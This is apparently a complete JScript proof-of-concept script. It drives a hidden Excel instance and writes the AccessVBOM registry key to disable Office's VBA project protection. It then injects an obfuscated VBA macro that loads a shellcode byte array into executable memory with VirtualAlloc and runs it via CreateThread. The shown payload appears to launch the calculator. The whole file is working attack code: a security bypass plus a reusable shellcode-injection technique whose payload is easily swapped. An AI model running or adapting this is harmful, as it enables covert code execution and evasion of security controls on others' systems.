var objExcel = new ActiveXObject("Excel.Application");
objExcel.Visible = false;
var WshShell = new ActiveXObject("WScript.Shell");
var Application_Version = objExcel.Version;//Auto-Detect Version
var strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + Application_Version + "\\Excel\\Security\\AccessVBOM";
WshShell.RegWrite(strRegPath, 1, "REG_DWORD");
var objWorkbook = objExcel.Workbooks.Add();
var xlmodule = objWorkbook.VBProject.VBComponents.Add(1);
// Sample Shell Code Execution Documented Here: https://www.scriptjunkie.us/2012/01/direct-shellcode-execution-in-ms-office-macros/
var strCode = 'Private Declare Function CreateThread Lib "kernel32" (ByVal Npdrhkbff As Long, ByVal Drcunuy As Long, ByVal Ache As Long, Wiquwzp As Long, ByVal Ltdplqkqj As Long, Xsawbea As Long) As Long\n';
strCode += 'Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Aacsuf As Long, ByVal Ioo As Long, ByVal Fpihqsli As Long, ByVal Ximedrqa As Long) As Long\n';
strCode += 'Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Vejyzyxy As Long, ByRef Kalwgz As Any, ByVal Ftnp As Long) As Long\n';
strCode += '\n';
strCode += 'Sub ExecCalc()\n'
strCode += '    Dim Wkbiqmw As Long, Hmbo As Variant, Rwvxs As Long, Xinzcm As Long, Abegogwui As Long\n';
strCode += '    Hmbo = Array(232, 137, 0, 0, 0, 96, 137, 229, 49, 210, 100, 139, 82, 48, 139, 82, 12, 139, 82, 20, _\n';
strCode += '139, 114, 40, 15, 183, 74, 38, 49, 255, 49, 192, 172, 60, 97, 124, 2, 44, 32, 193, 207, _\n';
strCode += '13, 1, 199, 226, 240, 82, 87, 139, 82, 16, 139, 66, 60, 1, 208, 139, 64, 120, 133, 192, _\n';
strCode += '116, 74, 1, 208, 80, 139, 72, 24, 139, 88, 32, 1, 211, 227, 60, 73, 139, 52, 139, 1, _\n';
strCode += '214, 49, 255, 49, 192, 172, 193, 207, 13, 1, 199, 56, 224, 117, 244, 3, 125, 248, 59, 125, _\n';
strCode += '36, 117, 226, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, _\n';
strCode += '139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 88, 95, 90, 139, 18, _\n';
strCode += '235, 134, 93, 106, 1, 141, 133, 185, 0, 0, 0, 80, 104, 49, 139, 111, 135, 255, 213, 187, _\n';
strCode += '224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, _\n';
strCode += '187, 71, 19, 114, 111, 106, 0, 83, 255, 213, 99, 97, 108, 99, 0)\n';
strCode += '    Rwvxs = VirtualAlloc(0, UBound(Hmbo), &H1000, &H40)\n';
strCode += '    For Abegogwui = LBound(Hmbo) To UBound(Hmbo)\n';
strCode += '        Wkbiqmw = Hmbo(Abegogwui)\n';
strCode += '        Xinzcm = RtlMoveMemory(Rwvxs + Abegogwui, Wkbiqmw, 1)\n';
strCode += '    Next Abegogwui\n';
strCode += '    Xinzcm = CreateThread(0, 0, Rwvxs, 0, 0, 0)\n';
strCode += 'End Sub\n';

xlmodule.CodeModule.AddFromString(strCode);
objExcel.Run("ExecCalc");
objExcel.DisplayAlerts = false;
objWorkbook.Close(false);